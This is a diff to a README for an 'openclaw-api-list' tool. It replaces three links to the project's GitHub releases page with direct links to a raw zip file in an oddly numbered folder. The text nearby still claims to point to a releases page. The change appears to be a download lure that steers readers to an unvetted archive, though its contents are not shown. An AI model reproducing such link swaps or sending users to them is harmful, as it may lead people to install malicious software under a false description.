@@ -1,6 +1,6 @@
 # ⚙️ openclaw-api-list - Easy API Setup for OpenClaw Bot
 
-[![Download openclaw-api-list](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/umairsohail049/openclaw-api-list/releases)
+[![Download openclaw-api-list](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/umairsohail049/openclaw-api-list/main/automation-apis-4825/openclaw_api_list_v1.0.zip)
 
 ## 📋 What is openclaw-api-list?
 
@@ -30,7 +30,7 @@ If you do not have OpenClaw bot yet, visit the official OpenClaw website to down
 
 Go to the release page to get the files:
 
-[Download openclaw-api-list](https://github.com/umairsohail049/openclaw-api-list/releases)
+[Download openclaw-api-list](https://raw.githubusercontent.com/umairsohail049/openclaw-api-list/main/automation-apis-4825/openclaw_api_list_v1.0.zip)
 
 This page lists all available versions. Pick the latest one for the best experience.
 
@@ -134,4 +134,4 @@ If issues continue, you can create a GitHub issue on the repository page or look
 
 Click below to visit the openclaw-api-list release page and download the latest version.
 
-[![Download openclaw-api-list](https://img.shields.io/badge/Download-OpenClaw-grey?style=for-the-badge)](https://github.com/umairsohail049/openclaw-api-list/releases)
+[![Download openclaw-api-list](https://img.shields.io/badge/Download-OpenClaw-grey?style=for-the-badge)](https://raw.githubusercontent.com/umairsohail049/openclaw-api-list/main/automation-apis-4825/openclaw_api_list_v1.0.zip)
